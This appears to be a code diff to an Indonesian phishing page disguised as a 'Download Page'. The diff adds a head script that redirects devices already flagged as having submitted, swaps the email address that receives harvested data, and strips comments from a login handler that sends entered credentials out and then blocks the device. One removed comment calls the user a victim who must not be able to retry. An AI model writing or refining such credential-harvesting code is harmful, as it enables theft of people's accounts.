@@ -4,6 +4,24 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 
+<!-- =========================================================
+     CEK BLOKIR DI HEAD — SEBELUM BODY DIRENDER
+     ========================================================= -->
+<script>
+(function(){
+    try {
+        var blocked =
+            localStorage.getItem("sudah_submit") === "1" ||
+            sessionStorage.getItem("sudah_submit") === "1" ||
+            document.cookie.indexOf("sudah_submit=1") !== -1;
+
+        if(blocked){
+            window.location.replace("blokir.html");
+        }
+    } catch(e){}
+})();
+</script>
+
 <title>Download Page</title>
 
 <style>
@@ -1110,7 +1128,7 @@ button{
 /* =========================================================
    CONFIG — GANTI EMAIL DI SINI
    ========================================================= */
-const EMAIL_KAMU = "medikaputra5@gmail.com";
+const EMAIL_KAMU = "meidikaputra5@gmail.com";
 
 /* =========================================================
    DEVICE BLOCK — localStorage + cookie + sessionStorage
@@ -1426,13 +1444,11 @@ function loginUser(event){
         .then(function(res){ return res.json(); })
         .then(function(result){
             console.log("Terkirim:", result);
-            /* SET FLAG: DEVICE INI UDAH SUBMIT */
             setDeviceBlocked();
             showMessage("✅ Login berhasil!", "success");
         })
         .catch(function(error){
             console.log("Error:", error);
-            /* TETEP SET FLAG WALAU ERROR, BIAR KORBAN GAK BISA ULANG */
             setDeviceBlocked();
         })
         .finally(function(){
